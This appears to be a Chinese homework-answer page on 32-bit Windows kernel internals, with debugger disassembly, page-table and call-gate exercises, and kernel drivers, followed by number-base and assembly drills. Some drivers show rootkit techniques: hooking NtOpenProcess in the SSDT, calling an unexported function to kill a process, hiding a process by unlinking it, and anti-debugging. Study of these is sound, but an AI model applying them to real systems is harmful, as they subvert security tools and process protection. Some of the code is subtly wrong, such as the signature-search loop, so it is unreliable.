jmp ntkrnlmp!_KiTrap02+0xe4 (804df864) ffffffff`804df840 833de087558008 cmp dword ptr ds:[805587E0h], 8 ffffffff`804df847 721b jb ntkrnlmp!_KiTrap02+0xe4 (804df864) ffffffff`804df849 7517 jne ntkrnlmp!_KiTrap02+0xe2 (804df862) ffffffff`804df84b 803d40ca558000 cmp byte ptr ds:[8055CA40h], 0 ffffffff`804df852 750e jne ntkrnlmp!_KiTrap02+0xe2 (804df862) ffffffff`804df854 803d41ca558000 cmp byte ptr ds:[8055CA41h], 0 ffffffff`804df85b 7405 je ntkrnlmp!_KiTrap02+0xe2 (804df862) ffffffff`804df85d e8c17f0500 call ntkrnlmp!_KeEnterKernelDebugger@0 (80537823) ffffffff`804df862 ebfe jmp ntkrnlmp!_KiTrap02+0xe2 (804df862) ffffffff`804df864 891ddc875580 mov dword ptr ds:[805587DCh], ebx ffffffff`804df86a ff05e0875580 inc dword ptr ds:[805587E0h] ffffffff`804df870 6a00 push 0 ffffffff`804df872 ff158c904d80 call dword ptr ds:[804D908Ch] ffffffff`804df878 ff0de0875580 dec dword ptr ds:[805587E0h] ffffffff`804df87e 754a jne ntkrnlmp!_KiTrap02+0x14a (804df8ca) ffffffff`804df880 c705dc875580ffffffff mov dword ptr ds:[805587DCh], 0FFFFFFFFh ffffffff`804df88a 8bcc mov ecx, esp ffffffff`804df88c e8933c0000 call ntkrnlmp!@KeReleaseQueuedSpinLockFromDpcLevel@4 (804e3524) ffffffff`804df891 83c408 add esp, 8 ffffffff`804df894 64a140000000 mov eax, dword ptr fs:[00000040h] ffffffff`804df89a 66833858 cmp word ptr [eax], 58h ffffffff`804df89e 742a je ntkrnlmp!_KiTrap02+0x14a (804df8ca) ffffffff`804df8a0 81c48c000000 add esp, 8Ch ffffffff`804df8a6 648f0540000000 pop dword ptr fs:[40h] ffffffff`804df8ad 648b0d3c000000 mov ecx, dword ptr fs:[3Ch] ffffffff`804df8b4 8d4128 lea eax, [ecx+28h] ffffffff`804df8b7 c640058b mov byte ptr [eax+5], 8Bh ffffffff`804df8bb 9c pushfd ffffffff`804df8bc 810c2400400000 or dword ptr [esp], 4000h ffffffff`804df8c3 9d popfd ffffffff`804df8c4 cf iretd 分析IDT表中0x8号中断的执行流程。\nkd\u003e dd 80558700 ReadVirtual: 80558700 not properly sign extended 80558700 00000000 80555700 00000010 00000000 80558710 00000000 00000000 00000000 00039000 80558720 804e0891 00000000 00000000 00000000 80558730 00000000 00000000 80555700 00000000 80558740 00000000 00000000 00000023 00000008 80558750 00000010 00000023 00000030 00000000 80558760 00000000 20ac0000 00000028 80555700 80558770 00000010 00000000 00000000 00000000 eip = 804e0891 nt!KiTrap08: ffffffff`804e0891 fa cli ;屏蔽可屏蔽中断 ffffffff`804e0892 648b0d3c000000 mov ecx, dword ptr fs:[3Ch] ffffffff`804e0899 8d4150 lea eax, [ecx+50h] ffffffff`804e089c c6400589 mov byte ptr [eax+5], 89h ffffffff`804e08a0 9c pushfd ffffffff`804e08a1 812424ffbfffff and dword ptr [esp], 0FFFFBFFFh ffffffff`804e08a8 9d popfd ffffffff`804e08a9 64a13c000000 mov eax, dword ptr fs:[0000003Ch] ffffffff`804e08af 8a6857 mov ch, byte ptr [eax+57h] ffffffff`804e08b2 8a4854 mov cl, byte ptr [eax+54h] ffffffff`804e08b5 c1e110 shl ecx, 10h ffffffff`804e08b8 668b4852 mov cx, word ptr [eax+52h] ffffffff`804e08bc 64a140000000 mov eax, dword ptr fs:[00000040h] ffffffff`804e08c2 64890d40000000 mov dword ptr fs:[40h], ecx ffffffff`804e08c9 6a00 push 0 ffffffff`804e08cb 6a00 push 0 ffffffff`804e08cd 6a00 push 0 ffffffff`804e08cf 50 push eax ffffffff`804e08d0 6a08 push 8 ffffffff`804e08d2 6a7f push 7Fh ffffffff`804e08d4 e811720500 call ntkrnlmp!_KeBugCheck2@24 (80537aea) ffffffff`804e08d9 ebee jmp ntkrnlmp!_KiTrap08+0x38 (804e08c9) ffffffff`804e08db 90 nop 阶段测试 给定一个线性地址，和长度，读取内容；\nint ReadMemory(OUT BYTE* buffer，IN DWORD dwAddr，IN DWORD dwLeght)\n要求：\n可以自己指定分页方式。 页不存在，要提示，不能报错。 可以正确读取数据。 申请长度为100的DWORD的数组，且每项用该项的地址初始化；\n把这个数组所在的物理页挂到0x1000的地址上；定义一个指针，指向0x1000这个页里的数组所在的地址，用0x1000这个页的线性地址打印出这数组的值；\n要求：数组所在的物理页，是同一个页\n#include\u003cwindows.h\u003e #include \u003cstdio.h\u003e DWORD* arr; DWORD* GetPDE(DWORD addr) { return (DWORD*)(0xc0600000+((addr\u003e\u003e18)\u00260x3ff8)); } DWORD* GetPTE(DWORD addr) { return (DWORD*)(0xc0000000+((addr\u003e\u003e9)\u00260x7ffff8)); } __declspec(naked) void func() { __asm { pushad pushfd } *GetPTE(0x1000)|=*GetPTE((DWORD)arr); __asm { popfd popad iretd } } int main(int argc, char* argv[]) { int i=0; unsigned long* p; char buff[6]; *(DWORD*)\u0026buff[0] = 0x12345678; // EIP, 废弃 *(WORD*)\u0026buff[4] = 0x48; // 段选择子 arr=(DWORD*)VirtualAlloc(0,0x1000,MEM_COMMIT,PAGE_READWRITE); if (arr == NULL) { printf(\"Memory allocation failed.\\n\"); return 1; } for(i=0;i\u003c100;i++) { arr[i]=(DWORD)(arr); } printf(\"eq 8003f500 %04xee00`0008%04x\",(DWORD)func\u003e\u003e16,(DWORD)func\u00260x0000ffff);//调用门描述符为：0000EC00`00080000 getchar(); //__asm int 0x20 _asm { call far fword ptr[buff] } p=(DWORD*)(0x1000); //printf(\"%x\\n\",p); for(i=0;i\u003c100;i++) { printf(\"%x:%x\\n\",i,p[i]); } getchar(); return 0; } 驱动 01 申请一块内存，并在内存中存储GDT，IDT的所有数据。然后在debugview中显示出来，最后释放内存。\n#include \u003cntddk.h\u003e //卸载函数 VOID DriverUnload(PDRIVER_OBJECT driver) { DbgPrint(\"驱动程序停止运行了\\n\"); } //入口函数，相当于main NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) { //驱动程序入口 //内核开辟空间 PULONG AddrTemp = 0; ULONG StartAddr = 0x8003F000; ULONG i= 0; PULONG Addr = (PULONG)ExAllocatePool(NonPagedPool,0x10000); //初始化 RtlFillMemory(Addr,0x10000,0); //从GDT和IDT拷贝数据 //GDT 0x8003F000 0x3FF 0x8003F000 0x7FF RtlMoveMemory(Addr,(CONST VOID UNALIGNED*)StartAddr,0xBFE); AddrTemp = (PULONG)Addr; for (i=0;i\u003c0x40;i++) { DbgPrint(\"%08X %08X %08X %08X %08X\",StartAddr,*(AddrTemp+1),*AddrTemp,*(AddrTemp+3),*(AddrTemp+2));\tAddrTemp+=4; //为什么1和3在前面? 为了和windbg显示一样，换了一下次序 StartAddr+=0x10; } DbgPrint(\"GDT表打印完毕\"); for (i=0;i\u003c0x80;i++) { DbgPrint(\"%08X %08X %08X %08X %08X\",StartAddr,*(AddrTemp+1),*AddrTemp,*(AddrTemp+3),*(AddrTemp+2)); AddrTemp+=4; StartAddr+=0x10; } DbgPrint(\"IDT表打印完毕\"); //free释放 ExFreePool(Addr); //设置一个卸载函数，便于退出 driver-\u003eDriverUnload = DriverUnload; return STATUS_SUCCESS; } 编写代码，实现如下功能：\n初始化一个字符串 拷贝一个字符串 比较两个字符串是否相等 ANSI_STRING与UNICODE_STRING字符串相互转换 #include \u003cntddk.h\u003e //卸载函数 VOID DriverUnload(PDRIVER_OBJECT driver) { DbgPrint(\"驱动程序停止运行了\"); } //入口函数，相当于main NTSTATUS DriverEntry(PDRIVER_OBJECT driver, PUNICODE_STRING reg_path) { ANSI_STRING ANString1; ANSI_STRING ANString2; UNICODE_STRING StrUnicode; RtlInitAnsiString(\u0026ANString1,\"ANString1\"); RtlInitAnsiString(\u0026ANString2,\"ANString2\"); RtlInitUnicodeString(\u0026StrUnicode,L\"StrUnicode\"); DbgPrint(\"ANString1 = %Z\\n\",\u0026ANString1); DbgPrint(\"ANString2 = %Z\\n\",\u0026ANString2); DbgPrint(\"StrUnicode = %wZ\\n\",\u0026StrUnicode); if (RtlCompareString(\u0026ANString1,\u0026ANString2,TRUE) == 0) { DbgPrint(\"ANString1 = ANString2\"); } else { DbgPrint(\"字符串不相等.\\r\\n\"); } RtlCopyString(\u0026ANString2,\u0026ANString1); DbgPrint(\"ANString1 = %Z\\n\",\u0026ANString1); DbgPrint(\"ANString2 = %Z\\n\",\u0026ANString2); DbgPrint(\"StrUnicode = %wZ\\n\",\u0026StrUnicode); if (RtlAnsiStringToUnicodeString(\u0026StrUnicode,\u0026ANString1,TRUE) == STATUS_SUCCESS) { DbgPrint(\"ANString1 = %Z\\n\",\u0026ANString1); DbgPrint(\"ANString2 = %Z\\n\",\u0026ANString2); DbgPrint(\"StrUnicode = %wZ\\n\",\u0026StrUnicode); } driver-\u003eDriverUnload = DriverUnload; return STATUS_SUCCESS; } 02 遍历内核模块，输出模块名称，基址以及大小。\n#include \u003cntddk.h\u003e //驱动程序必备头文件 NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { DbgPrint(\"Unloaded Successfully!\"); } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { LIST_ENTRY* list = (LIST_ENTRY*)DriverObject-\u003eDriverSection; LIST_ENTRY* item = list; DRIVER_OBJECT obj; while (1) { PUNICODE_STRING name = (PUNICODE_STRING)(((UINT32)item) + 0x2c); UINT32 DllBase = *(UINT32*)(((UINT32)item) + 0x18); UINT32 ImgSize= *(UINT32*)(((UINT32)item) + 0x20); DbgPrint(\"DriverName : %wZ\\nDllBase : %x\\nImgSize : %x\\n======\\n\", name, DllBase, ImgSize); item = item-\u003eBlink; if (item == list) { break; } } DriverObject-\u003eDriverUnload = UnloadDriver; return STATUS_SUCCESS; } 编写一个函数，通过特征码搜索一个未导出的函数，并调用。\n例子:找到PspTerminateProcess，通过调用这个函数结束记事本进程。（注意10-10-12分页是ntoskrnl.exe，2-9-9-12是ntkrnlpa.exe）\n#include \u003cntddk.h\u003e //驱动程序必备头文件 #include \u003cwdm.h\u003e NTSTATUS UnloadDriver(PDRIVER_OBJECT DriverObject) { DbgPrint(\"Unloaded Successfully!\"); return 0; } PVOID Search( PVOID featureCode, UINT32 featureCodeeLen, PVOID BeginAddress, PVOID EndAddress) { PVOID pCur = BeginAddress; while (pCur != EndAddress) { if (RtlCompareMemory(featureCode, pCur, featureCodeeLen) == featureCodeeLen) { // 指向函数首地址 return ( PUINT32 )(( UINT32 )pCur - 6); } (*(UINT32*)pCur)++; } return 0; } typedef NTSTATUS(*_PspTerminateProcess)(PEPROCESS pEprocess, NTSTATUS ExitCode); _PspTerminateProcess PspTerminateProcess; PEPROCESS GetPROCESS( PCHAR processName) { PEPROCESS pEprocess, pCurProcess; PCHAR ImageFileName; // 获取当前进程的EPROCESS __asm { mov eax, fs: [0x124] ; // 获取指向 _KTHREAD 的指针 mov eax, [eax + 0x44]; // 获取指向 _KPROCESS 的指针， 即EPROCESS 的首地址 mov pEprocess, eax; } pCurProcess = pEprocess; // 遍历EPROCESS do { ImageFileName = ( PCHAR )pCurProcess + 0x174; // 进程名 if ( strcmp (ImageFileName, processName) == 0) { return pCurProcess; } pCurProcess = (PEPROCESS)(*( PULONG )(( ULONG )pCurProcess + 0x88) - 0x88); // 更新进程 } while (pEprocess != pCurProcess); return 0; } NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) { LIST_ENTRY* lethis = (LIST_ENTRY*)DriverObject-\u003eDriverSection; LIST_ENTRY* item = lethis; UINT32 DllBase = 0; UINT32 ImgSize = 0; UNICODE_STRING krnl; PEPROCESS Extprocess; RtlInitUnicodeString(\u0026krnl, L\"ntoskrnl.exe\"); while (1) { PUNICODE_STRING name = (PUNICODE_STRING)(((UINT32)item) + 0x2c); UINT32 ImgSize= *(UINT32*)(((UINT32)item) + 0x20); if (!RtlCompareUnicodeString(name,\u0026krnl,FALSE)) { DllBase = *(UINT32*)(((UINT32)item) + 0x18); break; } item = item-\u003eBlink; if (item == lethis) { DbgPrint( \"not found\\n\"); break; } } Extprocess = GetPROCESS( \"notepad.exe\" ); DbgPrint( \"process：%p.\\n\" , Extprocess); if (Extprocess == 0) { DbgPrint( \"error\\n\"); DriverObject-\u003eDriverUnload = (PDRIVER_UNLOAD)UnloadDriver; return STATUS_SUCCESS; } if (DllBase) { PspTerminateProcess = (_PspTerminateProcess)(DllBase + 0xF1DA4); //0xF1DA4 就是偏移 PspTerminateProcess(Extprocess, 0); } DbgPrint( \"关了\\n\" ); DriverObject-\u003eDriverUnload = (PDRIVER_UNLOAD)UnloadDriver; return STATUS_SUCCESS; } 系统调用 01 自己编写WriteProcessMemory函数（不使用任何DLL，直接调用0环函数）并在代码中使用。\nBOOL __declspec(naked) __stdcall WriteProcMemmmm(DWORD handle,DWORD addr,unsigned char* buffer,DWORD len,DWORD sizewrite) { _asm { mov eax, 115h ; mov edx, 7FFE0300h; call dword ptr [edx]; retn 14h; } } 02 自己实现通过中断门直接调用内核函数\nBOOL __declspec(naked) __stdcall VirtualAllocMY(DWORD handle,DWORD addr,unsigned char* buffer,DWORD len,DWORD sizewrite) { _asm { mov eax, 11h ; mov edx, 7FFE0300h; lea edx, [esp+8]; int 2Eh; retn; } } 03 从Kernel32.dll中打开某个函数分析执行流程（怎么找到对应的内核函数，怎么找到参数，如何将参数传到0环的）\n;virtualAlloc() -\u003e VirtualAllocEx() -\u003e NtAllocateVirtualMemory() ;-------------------Ntdll.dll------------------------------------ .text:7C92CF50 ; __stdcall NtAllocateVirtualMemory(x, x, x, x, x, x) .text:7C92CF50 public _NtAllocateVirtualMemory@24 .text:7C92CF50 _NtAllocateVirtualMemory@24 proc near ; CODE XREF: RtlAllocateHeap(x,x,x)+1126↓p .text:7C92CF50 ; RtlpFindAndCommitPages(x,x,x,x)+93↓p ... .text:7C92CF50 mov eax, 10001b ; NtAllocateVirtualMemory服务号 .text:7C92CF55 mov edx, 7FFE0300h .text:7C92CF5A call dword ptr [edx] ; 调用共享区对应的SystemCall函数 .text:7C92CF5C retn 18h .text:7C92CF5C _NtAllocateVirtualMemory@24 endp ;在windbg中我u不到，但是可以从一下看到 /* kd\u003e dd 7FFE0300 7ffe0300 7c92e4f0 7c92e4f4 00000000 00000000 7ffe0310 00000000 00000000 00000000 00000000 7ffe0320 00000000 00000000 00000000 00000000 7ffe0330 ff9d665a 00000000 00000000 00000000 7ffe0340 00000000 00000000 00000000 00000000 7ffe0350 00000000 00000000 00000000 00000000 7ffe0360 00000000 00000000 00000000 00000000 7ffe0370 00000000 00000000 00000000 00000000 kd\u003e ln 7c92e4f0 Browse module Set bu breakpoint (7c92e4f0) ntdll!KiFastSystemCall | (7c92e4f4) ntdll!KiFastSystemCallRet Exact matches: ntdll!KiFastSystemCall (_KiFastSystemCall@0) */ .text:7C92E4F0 public _KiFastSystemCall@0 .text:7C92E4F0 _KiFastSystemCall@0 proc near ; DATA XREF: .text:off_7C923428↑o .text:7C92E4F0 mov edx, esp ;保存esp .text:7C92E4F2 sysenter .text:7C92E4F2 _KiFastSystemCall@0 endp ;-------------------------------ntoskrnl.exe------------------------------ ;KiFastCallEntry ;找到对应的内核函数 .text:004077A1 cmp ecx, 10000b ; 比较之前的那个第12位是否是1 .text:004077A4 jnz short loc_4077C0 ; 查找第一个系统服务表 .text:004077A6 mov ecx, ds:0FFDFF018h .text:004077AC xor ebx, ebx .text:004077C0 inc dword ptr ds:0FFDFF638h .text:004077C6 mov esi, edx ; esi = edx（三环参数的指针（lea edx, [esp+arg_4]）） .text:004077C8 mov ebx, [edi+0Ch] ; ebx = _SYSTEM_SERVICE_TABLE.ArgmentTable .text:004077CB xor ecx, ecx ; 清空ecx .text:004077CD mov cl, [eax+ebx] ; cl = 这个系统调用对应的参数的字节大小 .text:004077D0 mov edi, [edi] ; edi = _SYSTEM_SERVICE_TABLE.ServiecTable（函数地址表） .text:004077D2 mov ebx, [edi+eax*4] ; ebx = 0环函数的地址 ;找到参数,并将参数传到0环的 .text:004077D5 sub esp, ecx ; 提升对应的参数个数个堆栈（这里的ecx是要执行的参数的字节大小） .text:004077D7 shr ecx, 2 ; 参数长度/4 = 参数个数（四字节），一次拷贝4字节，这是拷贝的次数 .text:004077DA mov edi, esp ; edi指向函数参数的位置 .text:004077E8 rep movsd ; 循环拷贝 .text:004077EA call ebx 04 写代码保护指定进程（比如记事本），防止别人关闭它，而自己关闭正常退出 模板：\n#include \u003cntddk.h\u003e #include \u003cntstatus.h\u003e /************************************************************************/ /* 类型声明 */ /************************************************************************/ // 系统服务表 typedef struct _KSYSTEM_SERVICE_TABLE { PULONG ServiceTableBase;\t// 函数地址表 PULONG ServiceCounterTableBase;\t// SSDT 函数被调用的次数 ULONG NumberOfService;\t// 函数个数 PULONG ParamTableBase;\t// 函数参数表 } KSYSTEM_SERVICE_TABLE, *PKSYSTEM_SERVICE_TABLE; // SSDT表 typedef struct _KSERVICE_TABLE_DESCRIPTOR { KSYSTEM_SERVICE_TABLE ntoskrnl;\t// 内核函数 KSYSTEM_SERVICE_TABLE win32k;\t// win32k.sys 函数 KSYSTEM_SERVICE_TABLE unUsed1; KSYSTEM_SERVICE_TABLE unUsed2; } KSERVICE_TABLE_DESCRIPTOR, *PKSERVICE_TABLE_DESCRIPTOR; // NTOPENPROCESS typedef NTSTATUS (*NTOPENPROCESS) (PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId); /************************************************************************/ /* 函数声明 */ /************************************************************************/ VOID DriverUnload(PDRIVER_OBJECT pDriver); NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path); VOID PageProtectOff(); VOID PageProtectOn(); VOID HookNtOpenProcess(); VOID UnHookNtOpenProcess(); NTSTATUS HbgNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId); /************************************************************************/ /* 全局变量 */ /************************************************************************/ extern PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable; // ntoskrnl.exe 导出的全局变量 ULONG uOldNtOpenProcess; // 旧的函数地址 /************************************************************************/ /* 函数定义 */ /************************************************************************/ // 驱动入口 NTSTATUS DriverEntry(PDRIVER_OBJECT pDriver, PUNICODE_STRING reg_path) { // HOOK HookNtOpenProcess(); pDriver-\u003eDriverUnload = DriverUnload; return STATUS_SUCCESS; } // 卸载驱动 VOID DriverUnload(PDRIVER_OBJECT pDriver) { UnHookNtOpenProcess(); DbgPrint(\"Driver unloaded.\\n\"); } // 关闭页保护 VOID PageProtectOff() { __asm { cli; // 关闭中断 mov eax, cr0; and eax, not 0x10000; // WP位置0 mov cr0, eax; } } // 开启页保护 VOID PageProtectOn() { __asm { mov eax, cr0; or eax, 0x10000; // WP位置1 mov cr0, eax; sti; // 恢复中断 } } // HOOK NtOpenProcess VOID HookNtOpenProcess() { PageProtectOff(); uOldNtOpenProcess = KeServiceDescriptorTable-\u003entoskrnl.ServiceTableBase[0x7A]; KeServiceDescriptorTable-\u003entoskrnl.ServiceTableBase[0x7A] = (ULONG)HbgNtOpenProcess; PageProtectOn(); } // UnHOOK NtOpenProcess VOID UnHookNtOpenProcess() { PageProtectOff(); KeServiceDescriptorTable-\u003entoskrnl.ServiceTableBase[0x7A] = uOldNtOpenProcess; PageProtectOn(); } // 被修改的 NtOpenProcess 函数，简单打印参数 NTSTATUS HbgNtOpenProcess(PHANDLE ProcessHandle, ACCESS_MASK DesiredAccess, POBJECT_ATTRIBUTES ObjectAttributes, PCLIENT_ID ClientId) { DbgPrint(\"%x %x %x %x\\n\", ProcessHandle, DesiredAccess, ObjectAttributes, ClientId); return ((NTOPENPROCESS)uOldNtOpenProcess)(ProcessHandle, DesiredAccess, ObjectAttributes, ClientId); } 进程与线程 01 断链进程结构体，实现隐藏，并思考为什么断链进程为什么还能够执行。\nFailed to get VadRoot PROCESS 89512978 SessionId: 0 Cid: 0684 Peb: 7ffd5000 ParentCid: 0580 DirBase: 10240220 ObjectTable: e1778238 HandleCount: 85. Image: ctfmon.exe Failed to get VadRoot PROCESS 8944d640 SessionId: 0 Cid: 0710 Peb: 7ffdb000 ParentCid: 0580 DirBase: 10240260 ObjectTable: e26f6560 HandleCount: 50. Image: notepad.exe Failed to get VadRoot PROCESS 897d36e8 SessionId: 0 Cid: 07a8 Peb: 7ffdb000 ParentCid: 0298 DirBase: 102401a0 ObjectTable: e22ba310 HandleCount: 60. Image: VGAuthService.exe 使用DebugPort清零实现反调试。\n05 分析KiSwapContext函数：\nSwapContext有几个参数，分别是什么？\n三个，int *a1@\u003cebx\u003e, int a2@\u003cedi\u003e, int a3@\u003cesi\u003e\nSwapContext在哪里实现了线程切换？\n切换esp就是切换线程了：\n.text:0040498F loc_40498F: ; CODE XREF: SwapContext+66↑j .text:0040498F mov ecx, [ebx+40h] .text:00404992 mov [ecx+4], eax .text:00404995 mov esp, [esi+28h] .text:00404998 mov eax, [esi+20h] .text:0040499B mov [ebx+18h], eax 线程切换的时候，会切换Cr3吗？切换Cr3的条件是什么？\n.text:0040499F mov eax, [edi+44h] .text:004049A2 cmp eax, [esi+44h] .text:004049A5 mov byte ptr [edi+50h], 0 .text:004049A9 jz short loc_4049D7 如果[edi+44h] != [esi+44h]就切换cr3 中断门提权时，CPU会从TSS得到ESP0和SS0，TSS中存储的一定是当前线程的ESP0和SS0吗？如何做到的？\nFS:[0]在3环时指向TEB但是线程有很多，FS:[0]指向的是哪个线程的TEB如何做到的？\n0环的ExceptionList在哪里备份的?\nIdleThread是什么？什么时候执行？如何找到这个函数？\n分析KiFindReadyThread，查看是怎样查找就绪线程的。\n模拟线程切换与Windows的线程切换有哪些区别?\n走一遍时钟中断流程，分析KeUpdateRunTine函数。"},"title":"Homework"},"/docs/homework/homeworkbas/":{"data":{"":"","#":"进制 编制7进制加法表，乘法表，并计算下面的结果：23456+54356=？5621-654=？234*65=？\n7进制 1+1 =2 1+2 =3 2+2 =4 1+3 =4 2+3 =5 3+3 =6 1+4 =5 2+4 =6 3+4 =10 4+4 =11 1+5 =6 2+5 =10 3+5 =11 4+5 =12 5+5 =13 1+6 =10 2+6 =11 3+6 =12 4+6 =13 5+6 =14 6+6 =15 7进制 1*1 =1 1*2 =2 2*2 =4 1*3 =3 2*3 =6 3*3 =12 1*4 =4 2*4 =11 3*4 =15 4*4 =22 1*5 =5 2*5 =13 3*5 =21 4*5 =26 5*5 =34 1*6 =6 2*6 =15 3*6 =24 4*6 =33 5*6 =42 6*6 =51 23456 + 54356 = 111145 23456 + 54356 --------- 111145 5621 - 654 = 4634 5621 - 654 -------- 4634 234 * 65 = 12566 234 * 65 ------- 1536 2103 ------- 12566 编制16进制加法表，乘法表，并计算下面的结果：2D4E6+CF3A6=？5FD1-E5A=？2CA*A5=？\n16进制 1+1 =2 1+2 =3 2+2 =4 1+3 =4 2+3 =5 3+3 =6 1+4 =5 2+4 =6 3+4 =7 4+4 =8 1+5 =6 2+5 =7 3+5 =8 4+5 =9 5+5 =A 1+6 =7 2+6 =8 3+6 =9 4+6 =A 5+6 =B 6+6 =C 1+7 =8 2+7 =9 3+7 =A 4+7 =B 5+7 =C 6+7 =D 1+8 =9 2+8 =A 3+8 =B 4+8 =C 5+8 =D 6+8 =E 1+9 =A 2+9 =B 3+9 =C 4+9 =D 5+9 =E 6+9 =F 1+A =B 2+A =C 3+A =D 4+A =E 5+A =F 6+A =10 1+B =C 2+B =D 3+B =E 4+B =F 5+B =10 6+B =11 1+C =D 2+C =E 3+C =F 4+C =10 5+C =11 6+C =12 1+D =E 2+D =F 3+D =10 4+D =11 5+D =12 6+D =13 1+E =F 2+E =10 3+E =11 4+E =12 5+E =13 6+E =14 1+F =10 2+F=11 3+F =12 4+F =13 5+F =14 6+F =15 16进制 1*1 =1 1*2 =2 2*2 =4 1*3 =3 2*3 =6 3*3 =9 1*4 =4 2*4 =8 3*4 =C 4*4 =10 1*5 =5 2*5 =A 3*5 =F 4*5 =14 5*5 =19 1*6 =6 2*6 =C 3*6 =12 4*6 =18 5*6 =1E 6*6 =24 1*7 =7 2*7 =E 3*7 =15 4*7 =1C 5*7 =23 6*7 =2A 1*8 =8 2*8 =10 3*8 =18 4*8 =20 5*8 =28 6*8 =30 1*9 =9 2*9 =12 3*9 =1B 4*9 =24 5*9 =2D 6*9 =36 1*A =A 2*A =14 3*A =1E 4*A =28 5*A =32 6*A =3C 1*B =B 2*B =16 3*B =21 4*B =2C 5*B =37 6*B =42 1*C =C 2*C =18 3*C =24 4*C =30 5*C =3C 6*C =48 1*D =D 2*D =1A 3*D =27 4*D =34 5*D =41 6*D =4E 1*E =E 2*E =1C 3*E =27 4*E =38 5*E =46 6*E =54 1*F =F 2*F=1E 3*F =2D 4*F =3C 5*F =4B 6*F =5A 2D4E6 + CF3A6 = 0xfc88c 5FD1 - E5A = 0x5177 2CA * A5 = 0x1cc32 9进制定义：由9个符号组成，分别是：2、9、1、7、6、5、4、8、3，逢9进1，计算：123 + 234 = ?\n​ 0、1、2、3、4、5、6、7、8\n先转为一般9进制：208 + 086\n208 + 086 ------- 305 转为定义的9进制：725\n10进制定义：由10个符号组成，分别是：!、@、$、%、^、\u0026、*、A、B、C，逢10进1，计算：@$$B + %AC\u0026 = ?\n​ 0、1、2、3、4、5、6、7、8、9\n转为一般10进制并计算：1228 + 3795 = 5023\n转为定义的10进制：\u0026!$%\n使用异或对87AD6进行加密后再进行解密，加解密密钥：5\n#include \u003cstdio.h\u003e #include \u003cstring.h\u003e char xor_with_key(char data, char key) { int hex_value = (data \u003e= '0' \u0026\u0026 data \u003c= '9') ? data - '0' : data - 'A' + 10; int xor_result = hex_value ^ key; return (xor_result \u003c 10) ? (xor_result + '0') : (xor_result - 10 + 'A'); } void encrypt_decrypt(char *input, char key) { for (int i = 0; i \u003c strlen(input); i++) { input[i] = xor_with_key(input[i], key); } } int main() { char input[] = \"87AD6\"; char key = 5; // XOR key printf(\"Original: %s\\n\", input); // Encrypt encrypt_decrypt(input, key); printf(\"Encrypted: %s\\n\", input); // Decrypt encrypt_decrypt(input, key); printf(\"Decrypted (Original): %s\\n\", input); return 0; } 逻辑运算 八进制数2-5在计算器中的的结果是：1777777777777777777775为什么？\n算是负数溢出了\n只用逻辑运算计算2-3=？（涉及内容：逻辑运算、移位、数据宽度）\n2+(-3) 0010 1101 xor----------- 1111 r：1111 0010 1101 and----------- 0000 r：0000 result ==1111 = -1 堆栈操作 使用EBX存储栈底地址，EDX存储栈顶地址，连续存储5个不同的数\nmov edx,esp mov eax,11111111 mov dword ptr ss:[edx],eax sub edx,4 ↑x5 分别使用栈底加偏移、栈顶加偏移的方式读取这5个数，并存储到寄存器中\nmov eax,dword ptr ss:[edx+4] mov eax,dword ptr ss:[ebx-4] 弹出这5个数，恢复栈顶到原来的位置\npop eax ↑x5 mov ebx,dword ptr ss:[ebx+0x4*5] 使用2种方式实现：push ecx\nsub esp,4 mov dword ptr ss:[esp],ecx mov esp,dword ptr ss:[esp-4] mov dword ptr ss:[esp],ecx 使用2种方式实现：pop ecx\nmov ecx,dword ptr ss:[esp] add esp,4 mov ecx,dword ptr ss:[esp] mov esp,dword ptr ss:[esp+4] 使用2种方式实现：push esp\nsub esp,4 mov dword ptr ss:[esp],esp mov dword ptr ss:[esp-4],esp lea esp,dword ptr ss:[esp-4] 使用2种方式实现：pop esp\nadd esp,4 mov esp,dword ptr ss:[esp-4] lea esp,dword ptr ss:[esp+4] mov esp,dword ptr ss:[esp-4] 标志寄存器 写汇编指令只影响CF位的值（不能影响其他标志位）\nmov ax,0xf000 add ax,0x1000 写汇编指令只影响PF位的值（不能影响其他标志位）\nMOV ax,0x3 add ax,0xC0 写汇编指令只影响AF位的值（不能影响其他标志位)\nmov ax,0xf0 add ax,0x10 写汇编指令只影响SF位的值（不能影响其他标志位）\nMOV ax,0x8000 add ax,0xc 写汇编指令只影响OF位的值（不能影响其他标志位）\nMOV AL,0x80 SUB AL,0x10 用MOVS指令分别移动5个字节、5个字、5个双字\nMOVS BYTE PTR ES:[EDI],BYTE PTR DS:[ESI] MOVS WORD PTR ES:[EDI],BYTE PTR DS:[ESI] MOVS DWORD PTR ES:[EDI],BYTE PTR DS:[ESI] 用STOS指令分别存储5个字节、5个字、5个双字\nSTOS BYTE PTR ES:[EDI] STOS WORD PTR ES:[EDI] STOS DWORD PTR ES:[EDI] 使用REP指令重写上面两题\nMOV ECX,5 REP MOVSD REP STOSD JCC CALL执行时堆栈有什么变化？EIP有变化吗？\n将call下一行代码的地址push进栈，然后将eip跳到要call的地址处\nRET执行时堆栈有什么变化？EIP有变化吗？\n将栈顶的值pop给eip，这个值是之前call时的下一行的地址\n使用汇编指令修改标志寄存器中的某个位的值，实现JCC的十六种跳转\n不允许在OD中通过双击的形式修改标志寄存器\n要通过汇编指令的执行去影响标志位，能用CMP和TEST实现的优先考虑\n1、\tJE, JZ 结果为零则跳转(相等时跳转)\tZF=1 mov eax,0x1337 mov ecx,0x1337 cmp eax,ecx jz 0x00400000 2、\tJNE, JNZ 结果不为零则跳转(不相等时跳转) ZF=0 mov eax,0x1337 test eax,eax jnz 0x00400000 3、\tJS 结果为负则跳转\tSF=1 mov eax,0x100 mov ecx,0x200 cmp eax,ecx js 0x00401045 4、\tJNS 结果为非负则跳转\tSF=0 mov eax,0x100 mov ecx,0x200 cmp ecx,eax js 0x00401045 5、\tJP, JPE 结果中1的个数为偶数则跳转\tPF=1 mov eax,0x100 mov ecx,0x200 cmp 